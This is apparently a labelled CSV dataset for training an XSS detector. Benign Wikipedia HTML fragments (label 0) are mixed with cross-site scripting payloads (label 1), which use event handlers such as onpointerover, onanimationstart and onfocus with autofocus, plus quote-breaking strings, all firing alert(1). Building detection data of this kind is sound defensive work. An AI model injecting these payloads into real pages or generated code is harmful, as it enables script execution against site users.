,Sentence,Label
7000,"<li><a href=""/wiki/Commonsense_reasoning"" title=""Commonsense reasoning"">Commonsense reasoning </a> </li>",0
7001,"<aside draggable=""true"" ondrag=""alert(1)"">test</aside>",1
7002,"<body onmouseup=""alert(1)"">test</body>",1
7003,<content onpointerover=alert(1)>XSS</content>,1
7004,"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0
7005,"<applet onmousedown=""alert(1)"">test</applet>",1
7006,<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>,1
7007, ,0
7008,"<ins ondblclick=""alert(1)"">test</ins>",1
7009,<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>,1
7010,"<basefont onkeypress=""alert(1)"" contenteditable>test</basefont>",1
7011,"<sup onbeforecut=""alert(1)"" contenteditable>test</sup>",1
7012,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><span id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></span>",1
7013,"	 </span> <span class=""reference-text""><cite class=""citation journal"">Burgess, Matt (24 August 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.wired.co.uk/article/uk-trial-self-driving-trucks-platoons-roads"">""The UK is about to Start Testing Self-Driving Truck Platoons"" </a>. <i>Wired UK </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170922055917/http://www.wired.co.uk/article/uk-trial-self-driving-trucks-platoons-roads"">Archived </a> from the original on 22 September 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">20 September ",0
7014,	 </span> </li>,0
7015,"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationstart=""alert(1)""></summary>",1
7016,Stochastic temporal models:,0
7017,	 </span> 2016 ,0
7018,	 </span> </li>,0
7019,"<var onbeforepaste=""alert(1)"" contenteditable>test</var>",1
7020, </p>,0
7021,"<li><a href=""/wiki/Concept"" title=""Concept"">Concept </a> </li>",0
7022,"<dialog onbeforecut=""alert(1)"" contenteditable>test</dialog>",1
7023,<p id=x tabindex=1 onfocus=alert(1)></p>,1
7024,"<td onclick=""alert(1)"">test</td>",1
7025,"<li><a href=""/wiki/Pain_(philosophy)"" title=""Pain (philosophy)"">Pain </a> </li>",0
7026,"<style>@keyframes slidein {}</style><abbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></abbr>",1
7027,<rb onpointerout=alert(1)>XSS</rb>,1
7028,<menu onpointerover=alert(1)>XSS</menu>,1
7029,"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>",1
7030,"<button onmouseup=""alert(1)"">test</button>",1
7031,<textarea onfocusout=alert(1) id=x></textarea><input autofocus>,1
7032,"<li>if your opponent has played in a corner, take the opposite corner. Otherwise, </li>",0
7033,"d=""alert('');\"")""",1
7034,"\"";alert('');//",1
7035,"	 </span> <span class=""reference-text"">",0
7036,"<output onkeyup=""alert(1)"" contenteditable>test</output>",1
7037,<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>,1
7038,"<datalist oncontextmenu=""alert(1)"">test</datalist>",1
7039,"<article onmousedown=""alert(1)"">test</article>",1
7040,"<style>@keyframes x{}</style><table style=""animation-name:x"" onanimationstart=""alert(1)""></table>",1
7041,"<style>:target {color:red;}</style><output id=x style=""transition:color 1s"" ontransitionend=alert(1)></output>",1
